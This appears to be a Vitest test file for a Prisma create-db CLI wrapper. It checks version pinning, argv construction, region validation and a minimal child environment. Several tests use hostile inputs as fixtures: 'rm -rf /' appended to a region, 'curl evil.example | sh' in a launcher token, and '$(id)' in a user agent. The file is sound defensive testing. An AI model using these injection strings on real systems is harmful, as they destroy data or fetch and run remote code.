import { describe, expect, it } from "vitest";

import {
	buildCreateDbArgv,
	createDbEnv,
	PINNED_CREATE_DB_SPECIFIER,
	PINNED_CREATE_DB_VERSION,
} from "../src/cli.js";
import type { PrismaProviderError } from "../src/errors.js";

describe("buildCreateDbArgv", () => {
	it("pins the CLI version rather than resolving `latest` at run time", () => {
		const { argv } = buildCreateDbArgv();
		expect(PINNED_CREATE_DB_VERSION).not.toBe("latest");
		expect(argv).toContain(PINNED_CREATE_DB_SPECIFIER);
		expect(argv.join(" ")).not.toContain("create-db@latest");
	});

	it("names the `create` command explicitly and asks for JSON", () => {
		const { argv } = buildCreateDbArgv();
		expect(argv).toEqual([
			"npx",
			"--yes",
			PINNED_CREATE_DB_SPECIFIER,
			"create",
			"--json",
		]);
	});

	it("omits --json for a host pinned to a CLI without machine-readable output", () => {
		const { argv } = buildCreateDbArgv({ json: false });
		expect(argv).not.toContain("--json");
	});

	it("passes the region as one fused argv element", () => {
		const { argv } = buildCreateDbArgv({ region: "eu-central-1" });
		expect(argv).toContain("--region=eu-central-1");
		expect(
			argv.filter((element) => element.includes("eu-central-1")),
		).toHaveLength(1);
	});

	it("rejects a region the pinned CLI does not document", () => {
		expect(() =>
			// SAFETY: value was established by the surrounding parse or typed constructor.
			buildCreateDbArgv({ region: "us-east-1; rm -rf /" as never }),
		).toThrowError(/documented Prisma Postgres regions/u);
	});

	it("refuses a launcher token carrying shell metacharacters", () => {
		try {
			buildCreateDbArgv({ launcher: ["npx", "--yes; curl evil.example | sh"] });
			expect.unreachable(
				"a launcher token with shell metacharacters must be refused",
			);
		} catch (error) {
			// SAFETY: value was established by the surrounding parse or typed constructor.
			expect((error as PrismaProviderError).code).toBe(
				"PROVIDER_CONTRACT_CHANGED",
			);
		}
	});

	it("keeps a hostile user agent out of argv entirely", () => {
		expect(() => buildCreateDbArgv({ userAgent: "hobo$(id)" })).toThrowError(
			/user agent must be a plain identifier token/u,
		);
	});
});

describe("createDbEnv", () => {
	it("hands the child a small explicit environment, never process.env", () => {
		const env = createDbEnv();
		expect(Object.keys(env).sort()).toEqual(["CI", "FORCE_COLOR", "NO_COLOR"]);
		expect(env).not.toHaveProperty("PATH");
		expect(Object.isFrozen(env)).toBe(true);
	});
});
